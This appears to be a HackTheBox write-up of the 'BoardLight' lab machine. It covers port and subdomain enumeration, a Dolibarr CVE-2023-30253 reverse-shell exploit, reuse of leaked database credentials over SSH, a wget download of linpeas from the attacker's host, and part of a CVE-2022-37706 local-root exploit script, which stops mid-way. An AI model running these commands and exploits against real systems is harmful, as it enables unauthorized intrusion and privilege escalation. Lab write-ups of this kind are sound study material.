<!DOCTYPE html><html class="appearance-dark" lang="en"><head><meta charset="UTF-8"><title>BoardLight</title><meta name="description" content="scientia potentia est."><meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no, initial-scale=1"><!-- Google Analytics --><!-- End Google Analytics -->
<!-- Baidu Analytics --><!-- End Baidu Analytics --><link rel="icon" href="/hexo-theme-Claudia/images/favicon.jpg"><link rel="stylesheet" href="/style/common/bulma.css"><link rel="stylesheet" href="/style/base.css"><link rel="stylesheet" href="/style/common/helper.css"><script src="/js/common.js"></script><link rel="stylesheet" href="/style/post.css"><link rel="stylesheet" href="/style/themes/highlight-theme-light.css"><link rel="stylesheet" href="/style/common/jquery.fancybox.min.css"><script src="/js/highlight.pack.js"></script><meta name="description" content="
Target IP Address: 10.10.11.11
Information GatheringNMAP ScanningNmap scans network ports to determine their status (open, closed, or filtered), identifies services running on them, and detects their versions.

command used: (scanning for all ports fast and efficient)

sudo nmap -p- -sS --min-rate 5000 --open -T5 -vvv -Pn 10.10.11.11

-&amp;gt;output:
Nmap sc.."><meta name="generator" content="Hexo 7.1.1"></head><body class="is-flex is-flex-direction-column"><header class="header-widget is-flex-shrink-0 is-hidden-mobile"><div class="container is-fullhd is-flex is-justify-content-space-between is-align-items-center is-full-height"><section class="is-hidden-mobile is-flex-shrink-0"><h2><a href="/">Rãzvan's blog</a></h2></section><h3 class="is-hidden-mobile is-family-serif is-full-height is-flex is-align-items-center is-flex-shrink-0"><div class="is-full-height" id="postTopic"><p class="is-full-height is-flex-shrink-0 is-flex is-align-items-center is-justify-content-center">BoardLight</p><p class="is-full-height is-flex-shrink-0 is-flex is-align-items-center is-justify-content-center">Click back to the top</p></div></h3><aside class="is-flex-shrink-0"><h3 class="is-inline-block"><a href="/">Home</a></h3><h3 class="is-inline-block"><a href="/archives">Archives</a></h3></aside></div></header><header class="is-flex header-widget is-flex-shrink-0 is-align-items-center is-justify-content-center is-hidden-tablet"><h3 class="is-inline-block"><a href="/">Home</a></h3><h3 class="is-inline-block"><a href="/archives">Archives</a></h3></header><main><main class="container is-max-widescreen content section post-page pt-4 px-4"><div class="columns is-flex-desktop is-justify-content-center is-flex-direction-row-reverse"><div class="column is-3 is-hidden-mobile"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Information-Gathering"><span class="toc-text">Information Gathering</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#NMAP-Scanning"><span class="toc-text">NMAP Scanning</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NMAP-Full-Scanning"><span class="toc-text">NMAP Full Scanning</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Services"><span class="toc-text">Services</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#TCP-22-Default-Port-for-ssh"><span class="toc-text">TCP 22 (Default Port for ssh)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#TCP-80-Default-Port-for-HTTP"><span class="toc-text">TCP 80 (Default Port for HTTP)</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Directory-Busting"><span class="toc-text">Directory Busting</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Subdomain-Enumeration"><span class="toc-text">Subdomain Enumeration</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Exploitation"><span class="toc-text">Exploitation</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Privilege-Escalation"><span class="toc-text">Privilege Escalation</span></a></li></ol></div><div class="column is-9"><header class="my-4"><a href="/tags/HackTheBox"><i class="tag post-item-tag">HackTheBox</i></a><a href="/tags/CTF"><i class="tag post-item-tag">CTF</i></a><a href="/tags/Easy"><i class="tag post-item-tag">Easy</i></a></header><h1 class="mt-0 mb-1 is-family-serif" id="postTitle">BoardLight</h1><time class="has-text-grey" datetime="2024-07-26T15:31:13.000Z">2024-07-26</time><article class="mt-2 post-content"><p><img src="/../BoardLight_img/7768afed979c9abe917b0c20df49ceb8.webp" alt="alt text"></p>
<p>Target IP Address: 10.10.11.11</p>
<h1 id="Information-Gathering"><a href="#Information-Gathering" class="headerlink" title="Information Gathering"></a>Information Gathering</h1><h2 id="NMAP-Scanning"><a href="#NMAP-Scanning" class="headerlink" title="NMAP Scanning"></a>NMAP Scanning</h2><p>Nmap scans network ports to determine their status (open, closed, or filtered), identifies services running on them, and detects their versions.</p>
<ul>
<li>command used: (scanning for all ports fast and efficient)</li>
</ul>
<pre><code class="hljs jsx">sudo nmap -p- -sS --min-rate <span class="hljs-number">5000</span> --open -<span class="hljs-variable constant_">T5</span> -vvv -<span class="hljs-title class_">Pn</span> <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.11</span></code></pre>

<p>-&gt;output:</p>
<pre><code class="hljs jsx"><span class="hljs-title class_">Nmap</span> scan report <span class="hljs-keyword">for</span> <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.11</span>
<span class="hljs-title class_">Host</span> is up, received user-set (<span class="hljs-number">0.</span>043s latency).
<span class="hljs-title class_">Scanned</span> at <span class="hljs-number">2024</span>-<span class="hljs-number">07</span>-<span class="hljs-number">16</span> <span class="hljs-number">14</span>:<span class="hljs-number">43</span>:<span class="hljs-number">57</span> <span class="hljs-variable constant_">EDT</span> <span class="hljs-keyword">for</span> 12s
<span class="hljs-title class_">Not</span> <span class="hljs-attr">shown</span>: <span class="hljs-number">65166</span> closed tcp ports (reset), <span class="hljs-number">367</span> filtered tcp ports (no-response)
<span class="hljs-title class_">Some</span> closed ports may be reported <span class="hljs-keyword">as</span> filtered due to --defeat-rst-ratelimit
<span class="hljs-variable constant_">PORT</span>   <span class="hljs-variable constant_">STATE</span> <span class="hljs-variable constant_">SERVICE</span> <span class="hljs-variable constant_">REASON</span>
<span class="hljs-number">22</span>/tcp open  ssh     syn-ack ttl <span class="hljs-number">63</span>
<span class="hljs-number">80</span>/tcp open  http    syn-ack ttl <span class="hljs-number">63</span></code></pre>

<h2 id="NMAP-Full-Scanning"><a href="#NMAP-Full-Scanning" class="headerlink" title="NMAP Full Scanning"></a>NMAP Full Scanning</h2><ul>
<li>command used: ( scanning the ports we got )</li>
</ul>
<pre><code class="hljs jsx">nmap -A -sC -sV -p <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.11</span></code></pre>

<p>  -&gt; output:</p>
<pre><code class="hljs jsx"><span class="hljs-title class_">Nmap</span> scan report <span class="hljs-keyword">for</span> <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.11</span>
<span class="hljs-title class_">Host</span> is up (<span class="hljs-number">0.</span>041s latency).

<span class="hljs-variable constant_">PORT</span>   <span class="hljs-variable constant_">STATE</span> <span class="hljs-variable constant_">SERVICE</span> <span class="hljs-variable constant_">VERSION</span>
<span class="hljs-number">22</span>/tcp open  ssh     <span class="hljs-title class_">OpenSSH</span> <span class="hljs-number">8.</span>2p1 <span class="hljs-title class_">Ubuntu</span> 4ubuntu0<span class="hljs-number">.11</span> (<span class="hljs-title class_">Ubuntu</span> <span class="hljs-title class_">Linux</span>; protocol <span class="hljs-number">2.0</span>)
| ssh-<span class="hljs-attr">hostkey</span>: 
|   <span class="hljs-number">3072</span> <span class="hljs-number">06</span>:2<span class="hljs-attr">d</span>:3<span class="hljs-attr">b</span>:<span class="hljs-number">85</span>:<span class="hljs-number">10</span>:<span class="hljs-number">59</span>:<span class="hljs-attr">ff</span>:<span class="hljs-number">73</span>:<span class="hljs-number">66</span>:<span class="hljs-number">27</span>:7<span class="hljs-attr">f</span>:0<span class="hljs-attr">e</span>:<span class="hljs-attr">ae</span>:<span class="hljs-number">03</span>:<span class="hljs-attr">ea</span>:f4 (<span class="hljs-variable constant_">RSA</span>)
|   <span class="hljs-number">256</span> <span class="hljs-number">59</span>:<span class="hljs-number">03</span>:<span class="hljs-attr">dc</span>:<span class="hljs-number">52</span>:<span class="hljs-number">87</span>:3<span class="hljs-attr">a</span>:<span class="hljs-number">35</span>:<span class="hljs-number">99</span>:<span class="hljs-number">34</span>:<span class="hljs-number">44</span>:<span class="hljs-number">74</span>:<span class="hljs-number">33</span>:<span class="hljs-number">78</span>:<span class="hljs-number">31</span>:<span class="hljs-number">35</span>:fb (<span class="hljs-variable constant_">ECDSA</span>)
|_  <span class="hljs-number">256</span> <span class="hljs-attr">ab</span>:<span class="hljs-number">13</span>:<span class="hljs-number">38</span>:<span class="hljs-attr">e4</span>:3<span class="hljs-attr">e</span>:<span class="hljs-attr">e0</span>:<span class="hljs-number">24</span>:<span class="hljs-attr">b4</span>:<span class="hljs-number">69</span>:<span class="hljs-number">38</span>:<span class="hljs-attr">a9</span>:<span class="hljs-number">63</span>:<span class="hljs-number">82</span>:<span class="hljs-number">38</span>:<span class="hljs-attr">dd</span>:f4 (<span class="hljs-title class_">ED25519</span>)
<span class="hljs-number">80</span>/tcp open  http    <span class="hljs-title class_">Apache</span> httpd <span class="hljs-number">2.4</span><span class="hljs-number">.41</span> ((<span class="hljs-title class_">Ubuntu</span>))
|_http-<span class="hljs-attr">title</span>: <span class="hljs-title class_">Site</span> doesn<span class="hljs-string">&#x27;t have a title (text/html; charset=UTF-8).</span>
<span class="hljs-string">|_http-server-header: Apache/2.4.41 (Ubuntu)</span>
<span class="hljs-string">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span></code></pre>

<h2 id="Services"><a href="#Services" class="headerlink" title="Services"></a>Services</h2><h3 id="TCP-22-Default-Port-for-ssh"><a href="#TCP-22-Default-Port-for-ssh" class="headerlink" title="TCP 22 (Default Port for ssh)"></a>TCP 22 (Default Port for ssh)</h3><p>-&gt; SSH package version - Might be able to find the OS and version.</p>
<p>-&gt; SSH key fingerprint - Has the key been re-used somewhere (Another machine? Same machine, just another port&#x2F;service?)</p>
<p>-&gt; SSH banner - Any text (if at all) before the password prompt (often get legal warnings about connecting to it)</p>
<p>-&gt; SSH package version:</p>
<pre><code class="hljs jsx">nc -vn <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.11</span> <span class="hljs-number">22</span></code></pre>

<ul>
<li>output:</li>
</ul>
<pre><code class="hljs jsx">└─$ nc -vn <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.11</span> <span class="hljs-number">22</span>         
(<span class="hljs-variable constant_">UNKNOWN</span>) [<span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.11</span>] <span class="hljs-number">22</span> (ssh) open
<span class="hljs-variable constant_">SSH</span>-<span class="hljs-number">2.0</span>-<span class="hljs-title class_">OpenSSH</span>_8.2p1 <span class="hljs-title class_">Ubuntu</span>-4ubuntu0<span class="hljs-number">.11</span>
</code></pre>

<p>-&gt; SSH key fingerprint:</p>
<pre><code class="hljs jsx">ssh root@<span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.11</span></code></pre>

<ul>
<li>output:</li>
</ul>
<pre><code class="hljs jsx">└─$ ssh root@<span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.11</span>                                             
<span class="hljs-title class_">The</span> authenticity <span class="hljs-keyword">of</span> host <span class="hljs-string">&#x27;10.10.11.11 (10.10.11.11)&#x27;</span> can<span class="hljs-string">&#x27;t be established.</span>
<span class="hljs-string">ED25519 key fingerprint is SHA256:xngtcDPqg6MrK72I6lSp/cKgP2kwzG6rx2rlahvu/v0.</span>
<span class="hljs-string">This key is not known by any other names.</span>
<span class="hljs-string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span>
<span class="hljs-string">Warning: Permanently added &#x27;</span><span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.11</span><span class="hljs-string">&#x27; (ED25519) to the list of known hosts.</span></code></pre>

<h3 id="TCP-80-Default-Port-for-HTTP"><a href="#TCP-80-Default-Port-for-HTTP" class="headerlink" title="TCP 80 (Default Port for HTTP)"></a>TCP 80 (Default Port for HTTP)</h3><ul>
<li><blockquote>
<p>Web Server:</p>
</blockquote>
</li>
</ul>
<pre><code class="hljs jsx">└─$ curl -i <span class="hljs-attr">http</span>:<span class="hljs-comment">//10.10.11.11| head -n 50</span>
  % <span class="hljs-title class_">Total</span>    % <span class="hljs-title class_">Received</span> % <span class="hljs-title class_">Xferd</span>  <span class="hljs-title class_">Average</span> <span class="hljs-title class_">Speed</span>   <span class="hljs-title class_">Time</span>    <span class="hljs-title class_">Time</span>     <span class="hljs-title class_">Time</span>  <span class="hljs-title class_">Current</span>
                                 <span class="hljs-title class_">Dload</span>  <span class="hljs-title class_">Upload</span>   <span class="hljs-title class_">Total</span>   <span class="hljs-title class_">Spent</span>    <span class="hljs-title class_">Left</span>  <span class="hljs-title class_">Speed</span>
  <span class="hljs-number">0</span>     <span class="hljs-number">0</span>    <span class="hljs-number">0</span>     <span class="hljs-number">0</span>    <span class="hljs-number">0</span>     <span class="hljs-number">0</span>      <span class="hljs-number">0</span>      <span class="hljs-number">0</span> --:--:-- --:--:-- --:--:--     0HTTP/<span class="hljs-number">1.1</span> <span class="hljs-number">200</span> <span class="hljs-variable constant_">OK</span>
<span class="hljs-title class_">Date</span>: <span class="hljs-title class_">Tue</span>, <span class="hljs-number">16</span> <span class="hljs-title class_">Jul</span> <span class="hljs-number">2024</span> <span class="hljs-number">19</span>:<span class="hljs-number">11</span>:<span class="hljs-number">02</span> <span class="hljs-variable constant_">GMT</span>
<span class="hljs-title class_">Server</span>: <span class="hljs-title class_">Apache</span>/<span class="hljs-number">2.4</span><span class="hljs-number">.41</span> (<span class="hljs-title class_">Ubuntu</span>)
<span class="hljs-title class_">Vary</span>: <span class="hljs-title class_">Accept</span>-<span class="hljs-title class_">Encoding</span>
<span class="hljs-title class_">Transfer</span>-<span class="hljs-title class_">Encoding</span>: chunked
<span class="hljs-title class_">Content</span>-<span class="hljs-title class_">Type</span>: text/html; charset=<span class="hljs-variable constant_">UTF</span>-<span class="hljs-number">8</span>

&lt;!<span class="hljs-variable constant_">DOCTYPE</span> html&gt;
&lt;html&gt;

&lt;head&gt;
  &lt;!-- Basic --&gt;
  &lt;meta charset=&quot;utf-8&quot; /&gt;
  &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot; /&gt;
  &lt;!-- Mobile Metas --&gt;
  &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1, shrink-to-fit=no&quot; /&gt;
  &lt;!-- Site Metas --&gt;
  &lt;meta name=&quot;keywords&quot; content=&quot;&quot; /&gt;
  &lt;meta name=&quot;description&quot; content=&quot;&quot; /&gt;
  &lt;meta name=&quot;author&quot; content=&quot;&quot; /&gt;

  &lt;!-- slider stylesheet --&gt;
  &lt;!-- slider stylesheet --&gt;
  &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdnjs.cloudflare.com/ajax/libs/OwlCarousel2/2.3.4/assets/owl.carousel.min.css&quot; /&gt;

  &lt;!-- bootstrap core css --&gt;
  &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;css/bootstrap.css&quot; /&gt;

  &lt;!-- fonts style --&gt;
  &lt;link href=&quot;https://fonts.googleapis.com/css?family=Open+Sans:400,700|Poppins:400,700&amp;display=swap&quot; rel=&quot;stylesheet&quot;&gt;
  &lt;!-- Custom styles for this template --&gt;
  &lt;link href=&quot;css/style.css&quot; rel=&quot;stylesheet&quot; /&gt;
  &lt;!-- responsive style --&gt;
  &lt;link href=&quot;css/responsive.css&quot; rel=&quot;stylesheet&quot; /&gt;
&lt;/head&gt;

&lt;body&gt;
  &lt;div class=&quot;hero_area&quot;&gt;
    &lt;!-- header section strats --&gt;
    &lt;header class=&quot;header_section&quot;&gt;
      &lt;div class=&quot;container-fluid&quot;&gt;
        &lt;nav class=&quot;navbar navbar-expand-lg custom_nav-container pt-3&quot;&gt;
          &lt;a class=&quot;navbar-brand&quot; href=&quot;index.php&quot;&gt;
            &lt;span&gt;
              
            &lt;/span&gt;
          &lt;/a&gt;
          &lt;button class=&quot;navbar-toggler&quot; type=&quot;button&quot; data-toggle=&quot;collapse&quot; data-target=&quot;#navbarSupportedContent&quot; aria-controls=&quot;navbarSupportedContent&quot; aria-expanded=&quot;false&quot; aria-label=&quot;Toggle navigation&quot;&gt;
            &lt;span class=&quot;navbar-toggler-icon&quot;&gt;&lt;/span&gt;
100 15949    0 15949    0     0  63750      0 --:--:-- --:--:-- --:--:-- 63541
curl: Failed writing body
</code></pre>

<h1 id="Directory-Busting"><a href="#Directory-Busting" class="headerlink" title="Directory Busting"></a>Directory Busting</h1><p>Directory busting with Gobuster involves using the tool to brute-force and enumerate hidden directories and files on a web server.</p>
<ul>
<li>command used:</li>
</ul>
<pre><code class="hljs jsx">gobuster dir -u <span class="hljs-attr">http</span>:<span class="hljs-comment">//10.10.11.11 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt</span></code></pre>

<p>-&gt; output:</p>
<pre><code class="hljs jsx">/images               (<span class="hljs-title class_">Status</span>: <span class="hljs-number">301</span>) [<span class="hljs-title class_">Size</span>: <span class="hljs-number">311</span>] [--&gt; <span class="hljs-attr">http</span>:<span class="hljs-comment">//10.10.11.11/images/]</span>
<span class="hljs-regexp">/css                  (Status: 301) [Size: 308] [--&gt; http://10.10.11.11/css/]</span>
<span class="hljs-regexp">/</span>js                   (<span class="hljs-title class_">Status</span>: <span class="hljs-number">301</span>) [<span class="hljs-title class_">Size</span>: <span class="hljs-number">307</span>] [--&gt; <span class="hljs-attr">http</span>:<span class="hljs-comment">//10.10.11.11/js/]</span>
</code></pre>

<p>On &#x2F;images we find Information Disclosure:</p>
<pre><code class="hljs jsx"><span class="hljs-title class_">Forbidden</span>

<span class="hljs-title class_">You</span> don<span class="hljs-string">&#x27;t have permission to access this resource.</span>
<span class="hljs-string">Apache/2.4.41 (Ubuntu) Server at 10.10.11.11 Port 80</span></code></pre>

<h1 id="Subdomain-Enumeration"><a href="#Subdomain-Enumeration" class="headerlink" title="Subdomain Enumeration"></a>Subdomain Enumeration</h1><p>Add the IP Address to <code>/etc/hosts</code> as board.htb</p>
<p>Subdomain enumeration with wfuzz</p>
<ul>
<li>command used:</li>
</ul>
<pre><code class="hljs jsx">─$ wfuzz -w <span class="hljs-title class_">SecLists</span>/<span class="hljs-title class_">Discovery</span>/<span class="hljs-variable constant_">DNS</span>/subdomains-top1million-<span class="hljs-number">110000.</span>txt -H <span class="hljs-string">&quot;HOST: FUZZ.board.htb&quot;</span> -u <span class="hljs-attr">http</span>:<span class="hljs-comment">//board.htb --hw 1053</span></code></pre>

<p>-&gt; output:</p>
<pre><code class="hljs jsx">********************************************************
* <span class="hljs-title class_">Wfuzz</span> <span class="hljs-number">3.1</span><span class="hljs-number">.0</span> - <span class="hljs-title class_">The</span> <span class="hljs-title class_">Web</span> <span class="hljs-title class_">Fuzzer</span>                         *
********************************************************

<span class="hljs-title class_">Target</span>: <span class="hljs-attr">http</span>:<span class="hljs-comment">//board.htb/</span>
<span class="hljs-title class_">Total</span> <span class="hljs-attr">requests</span>: <span class="hljs-number">114441</span>

=====================================================================
<span class="hljs-variable constant_">ID</span>           <span class="hljs-title class_">Response</span>   <span class="hljs-title class_">Lines</span>    <span class="hljs-title class_">Word</span>       <span class="hljs-title class_">Chars</span>       <span class="hljs-title class_">Payload</span>                                                                                                                                                                    
=====================================================================

<span class="hljs-number">000000072</span>:   <span class="hljs-number">200</span>        <span class="hljs-number">149</span> L    <span class="hljs-number">504</span> W      <span class="hljs-number">6360</span> <span class="hljs-title class_">Ch</span>     <span class="hljs-string">&quot;crm - crm&quot;</span></code></pre>

<p>Found crm.board.htb, add it to &#x2F;etc&#x2F;hosts </p>
<p>Tried a xss script on the login form from <code>crm.board.htb</code> and we got this error : </p>
<pre><code class="hljs jsx"><span class="hljs-title class_">Access</span> refused to <span class="hljs-number">10.10</span><span class="hljs-number">.14</span><span class="hljs-number">.67</span> by <span class="hljs-variable constant_">SQL</span> or <span class="hljs-title class_">Script</span> injection protection <span class="hljs-keyword">in</span> main.<span class="hljs-property">inc</span>.<span class="hljs-property">php</span> - <span class="hljs-variable constant_">GETPOST</span> type=<span class="hljs-number">0</span> paramkey=username paramvalue=<span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span> page=/index.<span class="hljs-property">php</span>?mainmenu=<span class="hljs-variable constant_">USER</span></code></pre>

<p>In the end we don’t find anything related to xss.</p>
<p>Open crm.board.htb:</p>
<p><img src="/../BoardLight_img/1.png" alt="alt text"></p>
<p>Found an exploit for this (CVE-2023-30253)</p>
<p><img src="/../BoardLight_img/2.png" alt="alt text"></p>
<p>We found some default creds:</p>
<p><img src="/../BoardLight_img/3.png" alt="alt text"></p>
<p>It actually worked!</p>
<h1 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h1><p>Download the github exploit and run it in one tab while in other tab open a netcat listener:</p>
<pre><code class="hljs bash">python3 [exploit.py](http://exploit.py/) [http://crm.board.htb](http://crm.board.htb/) admin admin 10.10.14.34 4444</code></pre>

<pre><code class="hljs bash">└─$ nc -lvnp 3009</code></pre>

<p>Boom we get reverse shell:</p>
<p><img src="/../BoardLight_img/4.png" alt="alt text"></p>
<pre><code class="hljs bash">www-data@boardlight:~/html/crm.board.htb/htdocs/public/website$ <span class="hljs-built_in">id</span>
<span class="hljs-built_in">id</span>
uid=33(www-data) gid=33(www-data) <span class="hljs-built_in">groups</span>=33(www-data)</code></pre>

<p>On <code>~/html/crm.board.htb/htdocs$</code> a lot of directories but we do find a conf file so let’s check it out:</p>
<p><img src="/../BoardLight_img/5.png" alt="alt text"></p>
<p>→output:</p>
<pre><code class="hljs bash">&lt;?php
//
// File generated by Dolibarr installer 17.0.0 on May 13, 2024
//
// Take a look at conf.php.example file <span class="hljs-keyword">for</span> an example of conf.php file
// and explanations <span class="hljs-keyword">for</span> all possibles parameters.
//
<span class="hljs-variable">$dolibarr_main_url_root</span>=<span class="hljs-string">&#x27;http://crm.board.htb&#x27;</span>;
<span class="hljs-variable">$dolibarr_main_document_root</span>=<span class="hljs-string">&#x27;/var/www/html/crm.board.htb/htdocs&#x27;</span>;
<span class="hljs-variable">$dolibarr_main_url_root_alt</span>=<span class="hljs-string">&#x27;/custom&#x27;</span>;
<span class="hljs-variable">$dolibarr_main_document_root_alt</span>=<span class="hljs-string">&#x27;/var/www/html/crm.board.htb/htdocs/custom&#x27;</span>;
<span class="hljs-variable">$dolibarr_main_data_root</span>=<span class="hljs-string">&#x27;/var/www/html/crm.board.htb/documents&#x27;</span>;
<span class="hljs-variable">$dolibarr_main_db_host</span>=<span class="hljs-string">&#x27;localhost&#x27;</span>;
<span class="hljs-variable">$dolibarr_main_db_port</span>=<span class="hljs-string">&#x27;3306&#x27;</span>;
<span class="hljs-variable">$dolibarr_main_db_name</span>=<span class="hljs-string">&#x27;dolibarr&#x27;</span>;
<span class="hljs-variable">$dolibarr_main_db_prefix</span>=<span class="hljs-string">&#x27;llx_&#x27;</span>;
<span class="hljs-variable">$dolibarr_main_db_user</span>=<span class="hljs-string">&#x27;dolibarrowner&#x27;</span>;
<span class="hljs-variable">$dolibarr_main_db_pass</span>=<span class="hljs-string">&#x27;serverfun2$2023!!&#x27;</span>;
<span class="hljs-variable">$dolibarr_main_db_type</span>=<span class="hljs-string">&#x27;mysqli&#x27;</span>;
<span class="hljs-variable">$dolibarr_main_db_character_set</span>=<span class="hljs-string">&#x27;utf8&#x27;</span>;
<span class="hljs-variable">$dolibarr_main_db_collation</span>=<span class="hljs-string">&#x27;utf8_unicode_ci&#x27;</span>;
// Authentication settings
<span class="hljs-variable">$dolibarr_main_authentication</span>=<span class="hljs-string">&#x27;dolibarr&#x27;</span>;

//<span class="hljs-variable">$dolibarr_main_demo</span>=<span class="hljs-string">&#x27;autologin,autopass&#x27;</span>;
// Security settings
<span class="hljs-variable">$dolibarr_main_prod</span>=<span class="hljs-string">&#x27;0&#x27;</span>;
<span class="hljs-variable">$dolibarr_main_force_https</span>=<span class="hljs-string">&#x27;0&#x27;</span>;
<span class="hljs-variable">$dolibarr_main_restrict_os_commands</span>=<span class="hljs-string">&#x27;mysqldump, mysql, pg_dump, pgrestore&#x27;</span>;
<span class="hljs-variable">$dolibarr_nocsrfcheck</span>=<span class="hljs-string">&#x27;0&#x27;</span>;
<span class="hljs-variable">$dolibarr_main_instance_unique_id</span>=<span class="hljs-string">&#x27;ef9a8f59524328e3c36894a9ff0562b5&#x27;</span>;
<span class="hljs-variable">$dolibarr_mailing_limit_sendbyweb</span>=<span class="hljs-string">&#x27;0&#x27;</span>;
<span class="hljs-variable">$dolibarr_mailing_limit_sendbycli</span>=<span class="hljs-string">&#x27;0&#x27;</span>;

//<span class="hljs-variable">$dolibarr_lib_FPDF_PATH</span>=<span class="hljs-string">&#x27;&#x27;</span>;
//<span class="hljs-variable">$dolibarr_lib_TCPDF_PATH</span>=<span class="hljs-string">&#x27;&#x27;</span>;
//<span class="hljs-variable">$dolibarr_lib_FPDI_PATH</span>=<span class="hljs-string">&#x27;&#x27;</span>;
//<span class="hljs-variable">$dolibarr_lib_TCPDI_PATH</span>=<span class="hljs-string">&#x27;&#x27;</span>;
//<span class="hljs-variable">$dolibarr_lib_GEOIP_PATH</span>=<span class="hljs-string">&#x27;&#x27;</span>;
//<span class="hljs-variable">$dolibarr_lib_NUSOAP_PATH</span>=<span class="hljs-string">&#x27;&#x27;</span>;
//<span class="hljs-variable">$dolibarr_lib_ODTPHP_PATH</span>=<span class="hljs-string">&#x27;&#x27;</span>;
//<span class="hljs-variable">$dolibarr_lib_ODTPHP_PATHTOPCLZIP</span>=<span class="hljs-string">&#x27;&#x27;</span>;
//<span class="hljs-variable">$dolibarr_js_CKEDITOR</span>=<span class="hljs-string">&#x27;&#x27;</span>;
//<span class="hljs-variable">$dolibarr_js_JQUERY</span>=<span class="hljs-string">&#x27;&#x27;</span>;
//<span class="hljs-variable">$dolibarr_js_JQUERY_UI</span>=<span class="hljs-string">&#x27;&#x27;</span>;

//<span class="hljs-variable">$dolibarr_font_DOL_DEFAULT_TTF</span>=<span class="hljs-string">&#x27;&#x27;</span>;
//<span class="hljs-variable">$dolibarr_font_DOL_DEFAULT_TTF_BOLD</span>=<span class="hljs-string">&#x27;&#x27;</span>;
<span class="hljs-variable">$dolibarr_main_distrib</span>=<span class="hljs-string">&#x27;standard&#x27;</span>;
</code></pre>

<p>We find some credentials:</p>
<pre><code class="hljs bash"><span class="hljs-variable">$dolibarr_main_db_user</span>=<span class="hljs-string">&#x27;dolibarrowner&#x27;</span>;
<span class="hljs-variable">$dolibarr_main_db_pass</span>=<span class="hljs-string">&#x27;serverfun2$2023!!&#x27;</span></code></pre>

<p>Found user larissa:</p>
<pre><code class="hljs bash">larissa:x:1000:1000:larissa,,,:/home/larissa:/bin/bash
</code></pre>

<p>Log in with ssh as larissa with the password found previously:</p>
<pre><code class="hljs bash">└─$ ssh larissa@10.10.11.11    
</code></pre>

<p><img src="/../BoardLight_img/6.png" alt="alt text"></p>
<p>User.txt Flag: <code>7e690a8593a02c9ce82f294f4afcc895</code></p>
<h1 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h1><p>Uploading linpeas to the victim’s machine:</p>
<pre><code class="hljs bash">wget http://10.10.14.34:8000/linpeas.sh</code></pre>

<p><img src="/../BoardLight_img/7.png" alt="alt text"></p>
<p>Linpeas found <code>enlightement</code> with interesting permissions and we searched on google and found an exploit for this:</p>
<p><a target="_blank" rel="noopener" href="https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit/blob/main/exploit.sh">https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit/blob/main/exploit.sh</a></p>
<p>→ Copy the content of the exploit and create a file <code>exploit.sh</code>  on the victim machine :</p>
<pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span>

<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;CVE-2022-37706&quot;</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;[*] Trying to find the vulnerable SUID file...&quot;</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;[*] This may take few seconds...&quot;</span>

file=$(find / -name enlightenment_sys -perm -4000 2&gt;/dev/null | <span class="hljs-built_in">head</span> -1)
<span class="hljs-keyword">if</span> [[ -z <span class="hljs-variable">$&#123;file&#125;</span> ]]
<span class="hljs-keyword">then</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;[-] Couldn&#x27;t find the vulnerable SUID file...&quot;</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;[*] Enlightenment should be installed on your system.&quot;</span>
<span class="hljs-built_in">exit</span> 1
<span class="hljs-keyword">fi</span>

<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;[+] Vulnerable SUID binary found!&quot;</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;[+] Trying to pop a root shell!&quot;</span>
<span class="hljs-built_in">mkdir</span> -p /tmp/net
<span class="hljs-built_in">mkdir</span> -p <span class="hljs-string">&quot;/dev/../tmp/;/tmp/exploit&quot;</span>

<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;/bin/sh&quot;</span> &gt; /tmp/exploit
<span class="hljs-built_in">chmod</span> a+x /tmp/exploit
<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;[+] Enjoy the root shell :)&quot;</span>
